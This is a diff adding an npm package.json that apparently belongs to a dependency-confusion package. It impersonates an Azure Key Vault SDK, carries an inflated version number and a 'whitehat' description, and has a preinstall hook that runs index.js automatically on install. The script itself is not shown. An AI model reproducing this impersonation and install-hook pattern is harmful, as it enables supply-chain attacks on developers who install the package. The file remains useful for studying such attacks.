@@ -1,0 +1,39 @@
+{
+    "name": "azure-keyvault-certificates-ts",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-keyvault-certificates-ts@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-HUEtaCMEpRZHpStdrRakHqs2CMJbUA1/JG0IFS8iqVqJnrCzrPyxaPc6W8VeKw5AyyWkAwy+Ieo2W6wA7EcOIg==",
+        "shasum": "a306cfac64f4e9a13ac6e071f8efe823a18657ae",
+        "tarball": "https://registry.npmjs.org/azure-keyvault-certificates-ts/-/azure-keyvault-certificates-ts-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3594,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSijCRA9TVsSAnZWagAAzJEQAI/ytkUcSH+bK4dLbikF\nofU9q5FJiew/4Z/ryNr3shHV35hQ6t2tSRBaHRGpA0sixsFYp56pYclvZ12F\n+e4nFro1BaY3Ra3n00Ldfv1cxHCNdSbhnCDWKRrlE3Dwy2ZSz9pukwGmgeHg\ntxP9hLnkET13ZUH2i+aOLCl66iXCt2eAj+0zYHlUZH3aKCM6MeJVabGLzv2L\nAdvGOI5gtPD37IiqL0/ESelZne6TQXWYWqLT8CZNhZkl8JYuqzIylOfu4swB\n+0Wo6id4CQto3ZrMS9+O3bGH7a4C/wMiQDNUnnhqnujQCeKgxJQweFY2E57H\nB1G9Wz8a4YWaAeJM2UNlc1ic7bestFum7xo9G6+rMmV3nTwxF4hx0hrChQny\nOX1NqmP+38HEfIEm6Pebv4hb4VpGQYiDHjZXww2sbtxaa5qAOoiH+hURW5p1\ndesK78TI6+oCB0cf5YghTmAaPsbloFJTlZuwzkGTDj4YbXc2pPzqZpQQqxgh\nnGo9ZVhlZ5OZtD4fpve9rsIg7TsSpb1aIXz4yg/G6VemzTwIrm7ms47sMQXx\nFTujCtxETURaAs4J/55G5tXcIpC+m+500vGlOX/Yg884mTm989DYmriCP3rz\n/WHk1NqnlzyjdauLn8tiCnVeKNmJTI5XKUELJelVC7+/J9NHwtUlAcINo4JU\nFh3K\r\n=j9E8\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-keyvault-certificates-ts_99.10.9_1637951651252_0.9033902546489505"
+    },
+    "_hasShrinkwrap": false
+}
